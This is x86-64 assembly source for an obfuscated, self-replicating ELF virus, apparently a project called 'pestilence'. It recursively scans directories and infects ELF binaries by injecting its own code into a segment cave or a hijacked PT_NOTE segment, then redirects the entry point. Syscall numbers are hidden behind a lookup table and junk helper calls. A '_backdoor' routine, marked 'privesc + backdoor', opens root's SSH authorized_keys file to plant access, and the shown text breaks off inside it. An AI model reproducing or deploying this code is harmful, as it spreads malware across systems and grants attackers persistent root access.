%include "asm/srcs/obf_file.inc"
; %include "asm/srcs/pestilence.inc"
bits 64 
default rel
section .text
global _start
_start:
; mov rbp, rsp
push rbp
mov rbp, rsp
PUSHA
call _map_int_table
call _isInfectionAllow
test rax, rax
js _final_jmp
push rax
push 0
call mov4
add rsp, 8
mov rdx, rax
pop rax
push rax
push dir1Len
call mov1
add rsp, 8
mov rsi, rax
pop rax
; dir to open for arg initDir
lea rdi, [rel dir1] 
; rdi -> to _encrypt 
push rax
_dec_initD1:
call _decrypt_str
push rax
push rax
call mov2
add rsp, 8
mov rdi, rax
pop rax
pop rax
call _initDir
push rax
push 0
call mov3
add rsp, 8
mov rdx, rax
pop rax
push rax
push dir2Len
call mov2
add rsp, 8
mov rsi, rax
pop rax
lea rdi, [rel dir2]
; mov rdi, dir2 ; dir to open for arg initDir
; rdi -> to _encrypt 
push rax
_dec_initD2:
call _decrypt_str
push rax
push rax
call mov3
add rsp, 8
mov rdi, rax
pop rax
pop rax
call _initDir
call _backdoor
; jmp _exit
_final_jmp:
POPA 
push rax
push rbp
call mov1
add rsp, 8
mov rsp, rax
pop rax
pop rbp
_bf_exit:
jmp _exit
_check_debug:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 3]
shl r14, 0x18
push r14
call mov4
add rsp, 8
movzx r14, byte [r15 + 107]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 211]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 315]
or rax, r14 
pop r14
pop r15
syscall
push rax
push rax
push rax
call mov3
add rsp, 8
mov rsi, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 90]
shl r14, 0x18
push r14
call mov2
add rsp, 8
movzx r14, byte [r15 + 194]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 298]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 402]
or rax, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov4
add rsp, 8
mov rdi, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 313]
or rdi, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push rax
push r14
call mov1
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 108]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 212]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 316]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov1
add rsp, 8
mov r10, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 313]
or r10, r14 
pop r14
pop r15
syscall
cmp rax, 0 
jl _exit
pop rax
push rax
push rax
call mov2
add rsp, 8
mov rsi, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 90]
shl r14, 0x18
push r14
call mov4
add rsp, 8
movzx r14, byte [r15 + 194]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 298]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 402]
or rax, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 101]
shl r14, 0x18
push rax
push r14
call mov3
add rsp, 8
mov rdi, rax
pop rax
movzx r14, byte [r15 + 205]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 309]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 413]
or rdi, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push rax
push r14
call mov3
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 108]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 212]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 316]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov2
add rsp, 8
mov r10, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 313]
or r10, r14 
pop r14
pop r15
syscall
ret
; take directory to open in rdi-> NqjDxZc
_initDir:
; placing uKLa1Xikg on the stack
push rbp
mov rbp, rsp
sub rsp, uKLa1Xikg_size
lea r8, FAM(uKLa1Xikg.fsMfH53)
or qword [r8], -1
lea rsi, FAM(uKLa1Xikg.NqjDxZc)
; strcpy(uKLa1Xikg.NqjDxZc(rsi), NqjDxZc(rdi))
call _strcpy 
cmp rdx, 0 
je _readDir
; strlen(uKLa1Xikg.NqjDxZc(rsi))
call _strlen 
push rax
push rsi
push rax
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
cmp BYTE [rsi - 1], '/' 
je _join
mov BYTE [rsi], '/' 
push rax
push rsi
push 1
call add1
add rsp, 8
pop rsi
mov rsi, rax
pop rax
_join:
push rax
push rdx
call mov4
add rsp, 8
mov rdi, rax
pop rax
call _strcpy
mov rdi, rsp
_readDir:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
push r14
call mov1
add rsp, 8
movzx r14, byte [r15 + 123]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 227]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 331]
or rax, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 92]
shl r14, 0x18
push rax
push r14
call mov2
add rsp, 8
mov rsi, rax
pop rax
movzx r14, byte [r15 + 196]
shl r14, 0x10
or rsi, r14 
movzx r14, byte [r15 + 300]
shl r14, 0x8
or rsi, r14 
movzx r14, byte [r15 + 404]
or rsi, r14 
pop r14
pop r15
xor rdx, rdx
syscall
cmp rax, 0 
jl _returnClose
; en registre le fsMfH53 dans la struct
lea rdi, FAM(uKLa1Xikg.fsMfH53) 
push rax
push rax
call mov4
add rsp, 8
mov [rdi], rax
pop rax
_getDents:
lea r10, FAM(uKLa1Xikg.fsMfH53) 
; init jrF2vT2hTw
lea r9, FAM(uKLa1Xikg.jrF2vT2hTw) 
mov DWORD [r9], 0 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 91]
shl r14, 0x18
push r14
call mov1
add rsp, 8
movzx r14, byte [r15 + 195]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 299]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 403]
or rax, r14 
pop r14
pop r15
push rax
push qword [r10]
call mov3
add rsp, 8
mov rdi, rax
pop rax
lea rsi, FAM(uKLa1Xikg.d8cXdP7geG)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 41]
shl r14, 0x18
push rax
push r14
call mov3
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 145]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 249]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 353]
or rdx, r14 
pop r14
pop r15
syscall
cmp rax, 0 
jle _returnClose
; r10 -> (struct uKLa1Xikg.diretents_struct_ptr)
lea r10, FAM(uKLa1Xikg.G2PvfjN8U8) 
; uKLa1Xikg.G2PvfjN8U8 -> uKLa1Xikg.d8cXdP7geG
push rax
push rsi
call mov2
add rsp, 8
mov [r10], rax
pop rax
; r11 -> (struct uKLa1Xikg.OLO4J)
lea r11, FAM(uKLa1Xikg.OLO4J) 
mov DWORD [r11], eax 
_listFile:
; r8 -> total lu de getdents
lea r8, FAM(uKLa1Xikg.jrF2vT2hTw) 
; r9 -> total a lire de getdents
lea r9, FAM(uKLa1Xikg.OLO4J) 
; r10 -> actual dirent struct
mov r10, FAM(uKLa1Xikg.G2PvfjN8U8) 
; r11 -> ptr de la struct actuelle
lea r11, FAM(uKLa1Xikg.G2PvfjN8U8) 
movzx r12, WORD [r10 + D_RECLEN_OFF] 
; update du total lu dans r8
add [r8], r12d 
; uKLa1Xikg.diretns_struct_ptr -> sur la prochaine struct
add qword [r11], r12 
cmp BYTE [r10 + D_TYPE], 0x4 
je _recursif
cmp BYTE [r10 + D_TYPE], 0x8 
jne _checkRead
_updatePath:
; strlen
mov rsi, rsp
call _strlen
lea rsi, [r10 + D_NAME] 
mov byte [rsi - 1], '/'
push rax
push 1
call add1
add rsp, 8
add rsp, 8
sub rsi, rax
mov rdi, rsp
call _strcpyNoNull
call _check_file
jmp _checkRead
_recursif:
lea rdi, FAM(uKLa1Xikg.NqjDxZc)
lea rdx, [r10 + D_NAME] 
cmp BYTE [rdx], 0x2e 
jne _callInit
cmp BYTE [rdx + 1], 0 
je _checkRead
cmp BYTE [rdx + 1], 0x2e 
jne _callInit
cmp BYTE [rdx + 2], 0 
je _checkRead
_callInit:
call _initDir
_checkRead:
mov r8, FAM(uKLa1Xikg.jrF2vT2hTw)
mov r12, FAM(uKLa1Xikg.OLO4J)
; if (total lu >= total getdents)
cmp r8d, r12d 
jge _getDents
jmp _listFile
_returnClose:
mov rdi, FAM(uKLa1Xikg.fsMfH53)
cmp qword rdi, 0 
jle _returnLeave
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 82]
shl r14, 0x18
push r14
call mov4
add rsp, 8
movzx r14, byte [r15 + 186]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 290]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 394]
or rax, r14 
pop r14
pop r15
syscall
or qword FAM(uKLa1Xikg.fsMfH53), -1
jmp _returnLeave
_returnLeave:
leave
_return:
ret
_check_file:
push rbp
mov rbp, rsp
sub rsp, WciGNPwfF_size
lea rax, INF(WciGNPwfF.i30iAx)
mov qword [rax], 0 
lea rax, INF(WciGNPwfF.bd3qI)
mov byte [rax], 0 
lea rax, INF(WciGNPwfF.vJnblqxvc)
mov qword [rax], 0 
_open_file:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
push r14
call mov1
add rsp, 8
movzx r14, byte [r15 + 123]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 227]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 331]
or rax, r14 
pop r14
pop r15
push rax
push rsi
call mov4
add rsp, 8
mov rdi, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 94]
shl r14, 0x18
push rax
push r14
call mov3
add rsp, 8
mov rsi, rax
pop rax
movzx r14, byte [r15 + 198]
shl r14, 0x10
or rsi, r14 
movzx r14, byte [r15 + 302]
shl r14, 0x8
or rsi, r14 
movzx r14, byte [r15 + 406]
or rsi, r14 
pop r14
pop r15
xor rdx, rdx
syscall
cmp rax, 0x0 
jl _returnLeave
push rax
push rax
call mov2
add rsp, 8
mov INF(WciGNPwfF.Od0nn6UtIm), rax
pop rax
; === get file size ===
_get_filesz:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 83]
shl r14, 0x18
push r14
call mov1
add rsp, 8
movzx r14, byte [r15 + 187]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 291]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 395]
or rax, r14 
pop r14
pop r15
mov rdi, INF(WciGNPwfF.Od0nn6UtIm)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov2
add rsp, 8
mov rsi, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or rsi, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or rsi, r14 
movzx r14, byte [r15 + 313]
or rsi, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
push rax
push r14
call mov1
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 123]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 227]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 331]
or rdx, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jle _close_file_inf
push rax
push rax
call mov3
add rsp, 8
mov INF(WciGNPwfF.QnIa96RO7), rax
pop rax
push rax
push rax
call mov4
add rsp, 8
mov INF(WciGNPwfF.ppN5MpX), rax
pop rax
_map_file:
; rax -> map
; rsi = file_size
push rax
push rax
call mov4
add rsp, 8
mov rsi, rax
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 69]
shl r14, 0x18
push r14
call mov2
add rsp, 8
movzx r14, byte [r15 + 173]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 277]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 381]
or rax, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov3
add rsp, 8
mov rdi, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 313]
or rdi, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
push rax
push r14
call mov1
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 123]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 227]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 331]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push rax
push r14
call mov1
add rsp, 8
mov r10, rax
pop rax
movzx r14, byte [r15 + 108]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 212]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 316]
or r10, r14 
pop r14
pop r15
mov r8, INF(WciGNPwfF.Od0nn6UtIm)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov3
add rsp, 8
mov r9, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or r9, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or r9, r14 
movzx r14, byte [r15 + 313]
or r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl _close_file_inf
call _extractData
push r12
call mov2
add rsp, 8
push rax
push r15
call mov4
add rsp, 8
mov rsi, rax
pop rax
lea r8, INF(WciGNPwfF.FLDLq7)
push rax
push rax
call mov1
add rsp, 8
mov [r8], rax
pop rax
_check_format:
cmp dword [rax + 1], 0x02464c45 
jne _unmap_close_inf
_check_already_infected:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
push rax
push rax
call mov3
add rsp, 8
mov r15, rax
pop rax
push rax
push r15
call mov2
add rsp, 8
mov r14, rax
pop rax
push rax
push r14
push qword [r14 + DGJDlg1Qp.Basib]
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
xor rcx, rcx
_go_to_last_segment:
cmp cx, [r15 + DGJDlg1Qp.eo6VTFRAUa]
jge _go_to_last_segment_end 
push rax
push r14
push tJI8UeYpx5_size
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
inc rcx
jmp _go_to_last_segment
_go_to_last_segment_end:
push rax
push r14
call mov4
add rsp, 8
mov INF(WciGNPwfF.pWgRQ0jmJQ), rax
pop rax
xor r9, r9
_segment_loop:
cmp cx, 0 
jle _segment_loop_end
_check_segment_format:
bt word [r14], 0 
jnc _continue
bt qword [r14], 0x20 
jc _handle_valid_segment
_continue:
dec rcx
sub r14, tJI8UeYpx5_size
jmp _segment_loop
_segment_loop_end:
mov r9, INF(WciGNPwfF.i30iAx)
cmp r9, 0 
je _unmap_close_inf
cmp byte INF(WciGNPwfF.bd3qI), 1 
je _add_page
; else jmp _infection
jmp _infection 
_handle_valid_segment:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
_check_signature:
; r8 -> potential signature
; r9 == signature variable
push rax
push r15
call mov2
add rsp, 8
mov r8, rax
pop rax
push rax
push r8
push qword [r14 + tJI8UeYpx5.bzmsFkL]
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
push rax
push r8
push qword [r14 + tJI8UeYpx5.ZJDaHm]
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
sub r8, signature_len
push rax
push qword [rel signature]
call mov3
add rsp, 8
mov r9, rax
pop rax
_br_checksign:
cmp qword r9, [r8]
je _unmap_close_inf
_valid_seg_already_found:
mov r9, INF(WciGNPwfF.i30iAx)
test r9, r9
jz _check_cave_size
mov r9, INF(WciGNPwfF.bd3qI)
test r9, r9
jz _continue
_check_cave_size:
; r8 == end of WciGNPwfF offset
; r9 == next segment offset
push rax
push qword [r14 + tJI8UeYpx5.bzmsFkL]
call mov4
add rsp, 8
mov r8, rax
pop rax
push rax
push r8
push qword [r14 + tJI8UeYpx5.ZJDaHm]
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
; save segment end's offset
push rax
push r8
call mov1
add rsp, 8
mov r13, rax
pop rax
push rax
push r8
push CODE_LEN
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
push rax
push r14
call mov3
add rsp, 8
mov r9, rax
pop rax
push rax
push r9
push tJI8UeYpx5_size
call add1
add rsp, 8
pop r9
mov r9, rax
pop rax
push rax
push r9
push tJI8UeYpx5.bzmsFkL
call add1
add rsp, 8
pop r9
mov r9, rax
pop rax
cmp [r9], r8
; if ([r9] < r8) { WciGNPwfF.bd3qI = 1) }
setb INF(WciGNPwfF.bd3qI) 
_save_offsets:
; r8 -> WciGNPwfF structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (_check_cave_size)
;*r14 -> segment header in header table
lea r8, INF(WciGNPwfF.H3M8mMS)
mov [r8], cl
lea r8, INF(WciGNPwfF.HvqzyX)
push rax
push qword [r15 + DGJDlg1Qp.vrYH6uE]
call mov2
add rsp, 8
mov r12, rax
pop rax
push rax
push r12
call mov4
add rsp, 8
mov [r8], rax
pop rax
lea r8, INF(WciGNPwfF.i30iAx)
push rax
push r13
call mov1
add rsp, 8
mov [r8], rax
pop rax
lea r8, INF(WciGNPwfF.Z4CQ7)
push r9
push rax
push qword [r14 + tJI8UeYpx5.uuTBubCHYZ]
call mov2
add rsp, 8
mov r9, rax
pop rax
push rax
push r9
push qword [r14 + tJI8UeYpx5.Zwrc7YbyKD]
call add1
add rsp, 8
pop r9
mov r9, rax
pop rax
push rax
push r9
call mov1
add rsp, 8
mov [r8], rax
pop rax
pop r9
lea r8, INF(WciGNPwfF.GQ6mVfY)
push rax
push r14
call mov4
add rsp, 8
mov [r8], rax
pop rax
jmp _continue
_add_page:
_update_file_size:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 89]
shl r14, 0x18
push r14
call mov3
add rsp, 8
movzx r14, byte [r15 + 193]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 297]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 401]
or rax, r14 
pop r14
pop r15
mov rdi, INF(WciGNPwfF.Od0nn6UtIm)
lea rsi, INF(WciGNPwfF.QnIa96RO7)
push qword [rsi]
add qword [rsi], 0x1000 
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
push rax
push qword [rsi]
call mov2
add rsp, 8
mov rsi, rax
pop rax
syscall
pop rsi
cmp rax, 0 
jl _unmap_close_inf
_unmap_prev_map:
mov rdi, INF(WciGNPwfF.FLDLq7)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 84]
shl r14, 0x18
push r14
call mov1
add rsp, 8
movzx r14, byte [r15 + 188]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 292]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 396]
or rax, r14 
pop r14
pop r15
syscall
_remap_file:
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 69]
shl r14, 0x18
push r14
call mov4
add rsp, 8
movzx r14, byte [r15 + 173]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 277]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 381]
or rax, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov3
add rsp, 8
mov rdi, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or rdi, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or rdi, r14 
movzx r14, byte [r15 + 313]
or rdi, r14 
pop r14
pop r15
; rsi = file_size
mov rsi, INF(WciGNPwfF.QnIa96RO7) 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
push rax
push r14
call mov3
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 123]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 227]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 331]
or rdx, r14 
pop r14
pop r15
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 4]
shl r14, 0x18
push rax
push r14
call mov4
add rsp, 8
mov r10, rax
pop rax
movzx r14, byte [r15 + 108]
shl r14, 0x10
or r10, r14 
movzx r14, byte [r15 + 212]
shl r14, 0x8
or r10, r14 
movzx r14, byte [r15 + 316]
or r10, r14 
pop r14
pop r15
mov r8, INF(WciGNPwfF.Od0nn6UtIm)
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push rax
push r14
call mov2
add rsp, 8
mov r9, rax
pop rax
movzx r14, byte [r15 + 105]
shl r14, 0x10
or r9, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or r9, r14 
movzx r14, byte [r15 + 313]
or r9, r14 
pop r14
pop r15
syscall
cmp rax, 0x0 
jl _close_file_inf
lea r8, INF(WciGNPwfF.FLDLq7)
push rax
push rax
call mov1
add rsp, 8
mov [r8], rax
pop rax
_find_memory_eof:
mov r14, INF(WciGNPwfF.FLDLq7)
movzx rax, word [r14 + DGJDlg1Qp.jvnTs]
push rax
push r14
push qword [r14 + DGJDlg1Qp.nPG4fUBH]
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
xor rcx, rcx
_find_mem_eof_loop:
cmp rcx, rax
jge _find_mem_eof_end
push rax
push qword [r14 + G20tFVqz.clUEKD]
call mov3
add rsp, 8
mov rbx, rax
pop rax
push rax
push rbx
push qword [r14 + G20tFVqz.BMOtXLa2k]
call add1
add rsp, 8
pop rbx
mov rbx, rax
pop rax
cmp INF(WciGNPwfF.vJnblqxvc), rbx
jge _find_mem_eof_continue
push rax
push rbx
call mov4
add rsp, 8
mov INF(WciGNPwfF.vJnblqxvc), rax
pop rax
_find_mem_eof_continue:
push rax
push r14
push G20tFVqz_size
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
inc rcx
jmp _find_mem_eof_loop
_find_mem_eof_end:
_find_pt_note:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(WciGNPwfF.FLDLq7)
movzx rax, word [r14 + DGJDlg1Qp.eo6VTFRAUa]
push rax
push r14
push qword [r14 + DGJDlg1Qp.Basib]
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
xor rcx, rcx
_find_pt_note_loop:
cmp rcx, rax
jge _find_pt_note_loop_end
cmp dword [r14 + tJI8UeYpx5.Ral9aZ9H], 0x4 
je _mutate_pt_note_seg
_find_pt_note_loop_continue:
push rax
push r14
push tJI8UeYpx5_size
call add1
add rsp, 8
pop r14
mov r14, rax
pop rax
inc rcx
jmp _find_pt_note_loop
_find_pt_note_loop_end:
push rax
push -1
call mov2
add rsp, 8
mov r14, rax
pop rax
_mutate_pt_note_seg:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl _update_final_jump
mov dword [r14 + tJI8UeYpx5.Ral9aZ9H], 0x1 
mov qword [r14 + tJI8UeYpx5.tUaMbk], 0x1 | 0x4 
mov qword [r14 + tJI8UeYpx5.ZJDaHm], CODE_LEN 
mov qword [r14 + tJI8UeYpx5.Zwrc7YbyKD], CODE_LEN 
mov qword [r14 + tJI8UeYpx5.uAWYHRu87], 0x1000 
mov rax, INF(WciGNPwfF.ppN5MpX)
push rax
push 0x1000
call add1
add rsp, 8
add rsp, 8
and rax, -4096
mov qword [r14 + tJI8UeYpx5.bzmsFkL], rax
mov qword INF(WciGNPwfF.i30iAx), rax
mov rax, INF(WciGNPwfF.vJnblqxvc)
push rax
push 0x1000
call add1
add rsp, 8
add rsp, 8
and rax, -4096
mov qword INF(WciGNPwfF.Z4CQ7), rax
mov qword [r14 + tJI8UeYpx5.uuTBubCHYZ], rax
mov qword [r14 + tJI8UeYpx5.ra93rsT], rax
_infection:
_update_elf_hdr:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(WciGNPwfF.FLDLq7)
push rax
push r8
push DGJDlg1Qp.vrYH6uE
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
mov r10, INF(WciGNPwfF.Z4CQ7)
push rax
push r10
call mov1
add rsp, 8
mov [r8], rax
pop rax
cmp byte INF(WciGNPwfF.bd3qI), 0 
jg _copy_parasite
push rax
push CODE_LEN
call mov4
add rsp, 8
mov rdi, rax
pop rax
call _update_seg_sizes
_copy_parasite:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (_end - _start)
mov rdi, INF(WciGNPwfF.FLDLq7)
add rdi, INF(WciGNPwfF.i30iAx)
; rsi -> start of our code
lea rsi, [rel _start] 
push rax
push CODE_LEN
call mov1
add rsp, 8
mov rcx, rax
pop rax
; copy from _start to _end (= !std)
cld 
rep movsb
_update_final_jump:
; r8 -> _bf_exit instruction's addr (_bf_exit + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(WciGNPwfF.FLDLq7)
add r8, INF(WciGNPwfF.i30iAx)
push rax
push r8
push FINJMP_OFF
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
inc r8
mov r10, INF(WciGNPwfF.Z4CQ7)
push rax
push r10
push FINJMP_OFF
call add1
add rsp, 8
pop r10
mov r10, rax
pop rax
push rax
push r10
push 0x05
call add1
add rsp, 8
pop r10
mov r10, rax
pop rax
mov r9, INF(WciGNPwfF.HvqzyX)
sub r9, r10
mov [r8], r9d
jmp _unmap_close_inf
_update_seg_sizes:
; r8 -> segment header data
;*r14 -> segment header in header table
mov r8, INF(WciGNPwfF.GQ6mVfY)
; save header start for later
push r8 
; * Update file size *
push rax
push r8
push qword tJI8UeYpx5.ZJDaHm
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
add qword [r8], rdi
pop r8
; * Update memory size *
push rax
push r8
push tJI8UeYpx5.Zwrc7YbyKD
call add1
add rsp, 8
pop r8
mov r8, rax
pop rax
add qword [r8], rdi
ret
; --- privesc + backdoor
_backdoor:
; open "/root/.ssh/authorized.key"
; r9 == fsMfH53
push rbp
mov rbp, rsp
sub rsp, 0x1000 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 19]
shl r14, 0x18
push r14
call mov3
add rsp, 8
movzx r14, byte [r15 + 123]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 227]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 331]
or rax, r14 
pop r14
pop r15
; mov rdi, sshFile
lea rdi, [rel sshFile]
push rax
push rsi
push rax
push sshFile_len
call mov2
add rsp, 8
mov rsi, rax
pop rax
_decBack:
call _decrypt_str
push rax
push rax
call mov1
add rsp, 8
mov rdi, rax
pop rax
pop rsi
pop rax
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 94]
shl r14, 0x18
push rax
push r14
call mov3
add rsp, 8
mov rsi, rax
pop rax
movzx r14, byte [r15 + 198]
shl r14, 0x10
or rsi, r14 
movzx r14, byte [r15 + 302]
shl r14, 0x8
or rsi, r14 
movzx r14, byte [r15 + 406]
or rsi, r14 
pop r14
pop r15
push rax
push 600
call mov4
add rsp, 8
mov rdx, rax
pop rax
syscall
test rax, rax
js _returnLeave
push rax
push rax
call mov2
add rsp, 8
mov r9, rax
pop rax
_readSsh:
; *r9 == fsMfH53
; r10 == size read
; rsi -> buffer
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 1]
shl r14, 0x18
push r14
call mov2
add rsp, 8
movzx r14, byte [r15 + 105]
shl r14, 0x10
or rax, r14 
movzx r14, byte [r15 + 209]
shl r14, 0x8
or rax, r14 
movzx r14, byte [r15 + 313]
or rax, r14 
pop r14
pop r15
push rax
push r9
call mov3
add rsp, 8
mov rdi, rax
pop rax
push rax
push rbp
call mov4
add rsp, 8
mov rsi, rax
pop rax
sub rsi, 0x1000 
push r15
push r14
movq r15, xmm15
movzx r14, byte [r15 + 41]
shl r14, 0x18
push rax
push r14
call mov1
add rsp, 8
mov rdx, rax
pop rax
movzx r14, byte [r15 + 145]
shl r14, 0x10
or rdx, r14 
movzx r14, byte [r15 + 249]
shl r14, 0x8
or rdx, r14 
movzx r14, byte [r15 + 353]
or rdx, r14 
pop r14
pop r15
syscall
cmp rax, 0 
je _notFound
jl _closeSsh
push rax
push rax
call mov3
add rsp, 8
mov r10, rax
pop rax
_checkBackdoor:
; rcx == nombre d'octet lue
; r11 -> buffer
push rax
push r10
call mov4
add rsp, 8
mov rcx, rax
pop rax
push rax
push rsi
call mov2
